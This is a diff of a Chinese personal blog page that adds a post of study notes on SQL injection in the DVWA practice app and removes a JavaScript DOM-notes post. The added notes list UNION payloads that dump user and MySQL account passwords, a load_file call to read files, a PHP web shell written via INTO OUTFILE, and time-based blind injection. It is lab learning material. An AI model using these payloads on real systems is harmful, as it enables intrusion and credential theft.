@@ -78,6 +78,70 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
+      <a href="/11/10/2015/mysqlDvwa/" title="DVWA-SQLInject" itemprop="url">DVWA-SQLInject</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
+		
+  <p class="article-time">
+    <time datetime="2015-11-09T16:00:00.000Z" itemprop="datePublished"> 发表于 11-10-2015</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h1 id="DVWA笔记">DVWA笔记</h1><h2 id="0x1_Low_Injection">0x1 Low Injection</h2><h3 id="0x00_order_by_x_desc">0x00  order by x desc</h3><p>判断是否存在注入<br>可以判断<code>字段</code>数</p>
+<h3 id="0x01_union_select_1,2,3_—">0x01 union select 1,2,3  —</h3><p>用来判断在web显示的字段长度,长度不匹配就会返回错误<br><code>如果知道字段和表</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'union <span class="operator"><span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> user_id =<span class="number">1</span>)<span class="comment">--     '</span></span></span><br></pre></td></tr></table></figure></p>
+<h3 id="0x02_获取库名">0x02 获取库名</h3><p>一旦可以进行union操作,即可利用information_schema.schemata<br>union虽然限制了显示内容,但是我们可以利用concat_ws()进行字符串连接增加显示<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  1'union <span class="operator"><span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">concat_ws</span>(<span class="built_in">char</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="keyword">version</span>()))<span class="comment">--            </span></span><br><span class="line"><span class="string">'</span></span></span><br></pre></td></tr></table></figure></p>
+<p>concat_ws(‘ ‘,      ‘a’,’b’)     字符串连接函数,用空格连接a和b<br>char(32,58,32)                     unicode转字符<br>user()              返回当前用户<br>database()     当前数据库<br>version()         Mysql版本</p>
+<h3 id="0x03_获取版本信息_数据库">0x03 获取版本信息 数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1'union <span class="operator"><span class="keyword">select</span> <span class="number">1</span>,schema_name <span class="keyword">from</span> information_schema.schemata<span class="comment">-- </span></span><br><span class="line"><span class="string">'</span></span></span><br></pre></td></tr></table></figure>
+<p>information_schema.schemata     这个表显示的是所有的表名</p>
+<h3 id="0x04_显示当前的用户名和密码">0x04 显示当前的用户名和密码</h3><p>concat(user, ‘:’ , password);                 //和concat_ws()有所不一样,直接连接<br>1’union select 1,(concat(user,’:’,password)) from mysql.user—<br>//读取mysql数据库中user表的user和password字段内容</p>
+<h3 id="0x05_读取系统文件">0x05 读取系统文件</h3><p>load_file(‘../../xx.txt’);          文件目录不能无限../<br>load_file(‘E:/xampp/xx.text’);      //可以直接用这个方法</p>
+<h3 id="0x06_注入点直接写入shell">0x06 注入点直接写入shell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">'union select 1,     "&lt;?php</span><br><span class="line">system($_GET('</span>hexo<span class="string">'));    //hexo作为一个变量</span><br><span class="line">?&gt;" into outfile '</span>../../shell.php<span class="string">'--</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x1_Low_Blind_Injection">0x1 Low Blind Injection</h2><h3 id="0x01_判断是否存在注入点">0x01  判断是否存在注入点</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' and sleep(4)<span class="comment">-- </span></span><br><span class="line">'</span><br></pre></td></tr></table></figure>
+<p>如果存在注入点,网页会在4秒之后才会有反应</p>
+<h3 id="0x02_后面">0x02 后面</h3><p>和普通的一样,把最后一个换成<code>sleep(5)</code><br>sleep()如果sleep无效试试benchmark()[MySQL5.0以下]//这个没试过,以后直接查询手册即可</p>
+<p>其他的也都差不多</p>
+<h3 id="0x03_Medium_&amp;_High">0x03 Medium &amp; High</h3><p>Medium:   @直接关闭了错误回显<br>//这个的话盲注依然可以,但是需要耐心了<br>High:   检测是否被攻击,然后0-5秒内自动sleep()<br>//也需要时间把,更多而已,设成10秒就可以很明显了,结合F12的network看一下就行了</p>
+<h3 id="SQLMAP基本用法:">SQLMAP基本用法:</h3><p>定了注入的URL<br>-p 参数指定了注入的参数，这里指定了id，也就是通过URL中的id参数注入，遇到多参数的URL时候这个-p就十分有用了。<br>—current-db，让SQLMAP列举出当前的数据库名称<br>-v 这个参数这里并没有使用到，这个参数会改变输出log的详细程度，一般默认即可，如果是学习或是想查看sqlmap使用的payload，可以使用-v 3参数。<br>—level 这个很有bi用咯，我个人理解是提高检测的等级，也就是说level 3会比level 1使用更多的payload进行测试。</p>
+<h2 id="小技巧">小技巧</h2><p>id = -1 也可以实现报错,在没有引号的情况跟之下23w32217uy7yuhjnm 65ythggb</p>
+<h2 id="Reference">Reference</h2><p>Web漏洞实战教程 DVWA的使用和漏洞分析</p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/11/10/2015/mysqlDvwa/#comments" class="ds-thread-count comments-count-link" data-thread-key="11/10/2015/mysqlDvwa/" data-count-type="comments">&nbsp;</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
       <a href="/11/04/2015/1111/" title="双十一自动抢红包" itemprop="url">双十一自动抢红包</a>
   </h1>
   <p class="article-author">By
@@ -637,64 +701,6 @@ noauto          开机不自动挂载
 
 
 
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/10/08/2015/ClientJS-5/" title="Js学习笔记(5)" itemprop="url">Js学习笔记(5)</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
-		
-  <p class="article-time">
-    <time datetime="2015-10-07T16:00:00.000Z" itemprop="datePublished"> 发表于 10-08-2015</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h2 id="节点">节点</h2><h3 id="Js的css选择器">Js的css选择器</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> document.querySelector(selectors);  //和css选择完全一样</span><br><span class="line"> document.querySelectorAll();   //返回Nodelist</span><br><span class="line"> console.log(document.querySelector('[</span><br><span class="line"> "]'));//栗子</span><br><span class="line">&lt;!-- 要加东西!!!! --&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="一些概念和代码">一些概念和代码</h3><p><a href="http://www.w3school.com.cn/jsref/prop_node_nodetype.asp" target="_blank" rel="external">nodeType</a>    :可用于遍历网页</p>
-<p>获取节点属性:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.attributes[<span class="string">"onload"</span>]; <span class="comment">//&lt;body&gt;的onload属性值</span></span><br></pre></td></tr></table></figure></p>
-<p>获取特定节点的html代码:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">''</span>).innerHTML;  <span class="comment">//以字符串形式展示  </span></span><br><span class="line">                                               .outerHTML;  <span class="comment">//outerHTML包含选中节点的html内容</span></span><br></pre></td></tr></table></figure></p>
-<p><a href="http://zhidao.baidu.com/link?url=cBshl-3vyhx2BKqVmQ1fnmB94xtfrQ6oBLxZHbZjs5jyltwQIVi3cH9GKOF9Zx4hxuJ7GO9R3UIXICsDEtjGwa" target="_blank" rel="external">CDATASection</a></p>
-<p>demo:查找某个节点的所有text节点<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> textContent = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> child,type,s = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>(child = e.firstChild; child != <span class="literal">null</span>; child = child.nextSibling)&#123;</span><br><span class="line">        type = child.nodeType;</span><br><span class="line">        <span class="keyword">if</span>(type === <span class="number">3</span> || type === <span class="number">4</span>)    <span class="comment">//Text和CDATASection</span></span><br><span class="line">            s += child.nodeValue;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (type === <span class="number">1</span>)</span><br><span class="line">            s += textContent(child);    <span class="comment">//如果该节点是子节点(元素),节点递归</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="节点的增删改查">节点的增删改查</h2><h3 id="创建">创建</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> loadaync = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params">url</span>)</span>&#123;   <span class="comment">//head头中插入一条外链js</span></span><br><span class="line">    <span class="keyword">var</span> head = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"head"</span>)[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.creatElement(<span class="string">"script"</span>);</span><br><span class="line">    s.src = url;</span><br><span class="line">    head.appendChild(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>Text节点可以用如下方式创建:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> newnode = <span class="built_in">document</span>.createTextNode(<span class="string">"New words"</span>);</span><br></pre></td></tr></table></figure></p>
-<h3 id="插入">插入</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> insertAt = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params">parent, child, n</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">0</span> || n &gt;parent.childNodes.length)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Invalid index!"</span>);  <span class="comment">//对n的位置进行报错处理</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n == parent.childNodes.length)</span><br><span class="line">        parent.appendChild(child);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        parent.insertBefore(child, parent.childNodes[n]);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="删除和替换">删除和替换</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//删除</span></span><br><span class="line">n.parentNode.removeChild( n );  <span class="comment">//在父节点运行函数</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//替换n节点</span></span><br><span class="line">n.parentNode.replaceChild( <span class="built_in">document</span>.creatTextNode(<span class="string">"[ Redacted ]"</span>),n);  <span class="comment">//在父节点运行函数</span></span><br></pre></td></tr></table></figure>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/10/08/2015/ClientJS-5/#comments" class="ds-thread-count comments-count-link" data-thread-key="10/08/2015/ClientJS-5/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
 
   <nav id="page-nav" class="clearfix">
     <a class="extend prev" rel="prev" href="/page/2/"><span></span>Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">Next<span></span></a>
@@ -719,7 +725,7 @@ noauto          开机不自动挂载
   
   <div class="archiveslist">
     <p class="asidetitle"><a href="/archives">归档</a></p>
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">四月 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">三月 2016</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">二月 2016</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">一月 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">十二月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">15</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">四月 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">三月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">二月 2016</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">一月 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">十二月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">15</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">1</span></li></ul>
   </div>
 
 
@@ -745,7 +751,7 @@ noauto          开机不自动挂载
 		  
 		
 		  
-			<li><a href="/categories/Linux/" title="Linux">Linux<sup>14</sup></a></li>
+			<li><a href="/categories/Linux/" title="Linux">Linux<sup>15</sup></a></li>
 		  
 		
 		  
